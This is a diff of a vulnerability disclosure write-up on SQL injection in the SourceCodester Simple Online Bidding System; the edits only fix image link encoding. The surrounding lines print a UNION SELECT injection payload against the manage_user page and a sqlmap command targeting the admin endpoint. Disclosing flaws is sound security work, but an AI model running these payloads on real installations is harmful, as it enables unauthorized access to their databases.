@@ -12,7 +12,7 @@ injection parameter:$_Get['id']
 
 The parameter $_Get['id'] here is directly spliced into the sql statement after removing the null value. There is a sql injection point.
 
-![image-20240515151923449](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Online Bidding System Sql Inject-3.assets/image-20240515151923449.png)
+![image-20240515151923449](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-3.assets/image-20240515151923449.png)
 
 #### 2.Vulnerability verification and exploit
 
@@ -24,7 +24,7 @@ First, you can test that the number of queries is 9, and further test the echo p
 page=manage_user&id=-2+union+select+1,2,3,4,5,6,7,8,9%23
 ```
 
-![image-20240515152128385](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Online Bidding System Sql Inject-3.assets/image-20240515152128385.png)
+![image-20240515152128385](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-3.assets/image-20240515152128385.png)
 
 Then you can select 2 and 3 as the echo positions, modify the payload to query the database name and current database user name.
 
@@ -40,4 +40,4 @@ We can also use sqlmap to conduct injection point testing. The test results are 
 python sqlmap.py -u "http://x.x.x.x/admin/index.php?page=manage_user&id=1" --cookie="PHPSESSID=xxxxxxxxxxxxxxxxxxxxx" --batch
 ```
 
-![image-20240515161603191](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester Simple Online Bidding System Sql Inject-3.assets/image-20240515161603191.png)
+![image-20240515161603191](https://github.com/rockersiyuan/CVE/blob/main/SourceCodester%20Simple%20Online%20Bidding%20System%20Sql%20Inject-3.assets/image-20240515161603191.png)
